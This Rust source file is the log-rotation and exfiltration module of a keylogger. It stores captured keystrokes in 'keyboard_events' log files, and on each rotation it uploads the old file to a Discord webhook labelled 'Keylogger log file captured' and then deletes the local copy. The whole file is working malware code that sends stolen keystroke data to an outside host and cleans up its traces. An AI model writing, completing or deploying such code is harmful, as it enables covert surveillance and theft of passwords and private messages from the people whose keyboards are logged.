use crate::utils::writer::FileWriter;
use chrono::Local;
use std::fs;
use std::io::Result;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

pub struct LogManager {
    current_writer: FileWriter,
    current_path: PathBuf,
    webhook_url: Option<String>,
    output_dir: PathBuf,
    rotation_interval: Duration,
    last_rotation: Instant,
}

impl LogManager {
    pub fn new(
        output_dir: &str,
        rotation_interval: Duration,
        webhook_url: Option<String>,
    ) -> Result<Self> {
        let output_dir = PathBuf::from(output_dir);
        fs::create_dir_all(&output_dir)?;

        let initial_path = Self::create_log_path(&output_dir);
        let mut writer = FileWriter::new(initial_path.to_str().unwrap())?;

        writer.write_line(&format!(
            "[{}] Log rotation initialized",
            Self::get_timestamp()
        ))?;

        Self::update_current_log_pointer(&output_dir, &initial_path)?;

        Ok(Self {
            current_writer: writer,
            current_path: initial_path,
            webhook_url,
            output_dir,
            rotation_interval,
            last_rotation: Instant::now(),
        })
    }

    pub fn write_line(&mut self, content: &str) -> Result<()> {
        if self.last_rotation.elapsed() >= self.rotation_interval {
            self.rotate()?;
            self.last_rotation = Instant::now();
        }
        self.current_writer.write_line(content)
    }

    pub fn rotate(&mut self) -> Result<()> {
        println!("Rotating log files...");

        let old_path = self.current_path.clone();

        let new_path = Self::create_log_path(&self.output_dir);
        let mut new_writer = FileWriter::new(new_path.to_str().unwrap())?;

        new_writer.write_line(&format!(
            "[{}] Log rotated from {}",
            Self::get_timestamp(),
            old_path.display()
        ))?;

        Self::update_current_log_pointer(&self.output_dir, &new_path)?;

        self.current_writer = new_writer;
        self.current_path = new_path;

        let webhook_url = self.webhook_url.clone();
        std::thread::spawn(move || {
            if let Some(url) = webhook_url {
                println!("Sending log to Discord webhook: {}", old_path.display());
                if let Err(e) = Self::send_to_discord(&old_path, &url) {
                    eprintln!("Failed to send to Discord: {}", e);
                } else {
                    println!("Successfully sent log to Discord");
                }
            }

            println!("Deleting old log file: {}", old_path.display());
            if let Err(e) = fs::remove_file(&old_path) {
                eprintln!("Failed to delete old file {}: {}", old_path.display(), e);
            }
        });

        Ok(())
    }

    fn create_log_path(output_dir: &Path) -> PathBuf {
        output_dir.join(format!("keyboard_events_{}.log", Self::current_timestamp()))
    }

    fn update_current_log_pointer(output_dir: &Path, log_path: &Path) -> Result<()> {
        let pointer_path = output_dir.join("current_log.txt");
        fs::write(&pointer_path, log_path.to_str().unwrap())
    }

    fn current_timestamp() -> String {
        Local::now().format("%Y-%m-%dT%H-%M-%S%.3f").to_string()
    }

    fn get_timestamp() -> String {
        let now = std::time::SystemTime::now();
        let datetime: chrono::DateTime<Local> = now.into();
        datetime.format("%Y-%m-%d %H:%M:%S%.3f").to_string()
    }

    fn send_to_discord(
        file_path: &PathBuf,
        webhook_url: &str,
    ) -> std::result::Result<(), Box<dyn std::error::Error>> {
        use reqwest::blocking::multipart;

        let client = reqwest::blocking::Client::new();

        if !file_path.exists() {
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                format!("File not found: {}", file_path.display()),
            )));
        }

        let file_content = std::fs::read(file_path)?;
        let file_name = file_path
            .file_name()
            .unwrap_or_default()
            .to_str()
            .unwrap_or("keylog.txt");

        let part = multipart::Part::bytes(file_content)
            .file_name(file_name.to_string())
            .mime_str("text/plain")?;

        let form = multipart::Form::new()
            .text(
                "content",
                format!("Keylogger log file captured at {}", Local::now()),
            )
            .part("file", part);

        let response = client.post(webhook_url).multipart(form).send()?;

        if response.status().is_success() {
            Ok(())
        } else {
            Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("Discord API error: {}", response.status()),
            )))
        }
    }
}
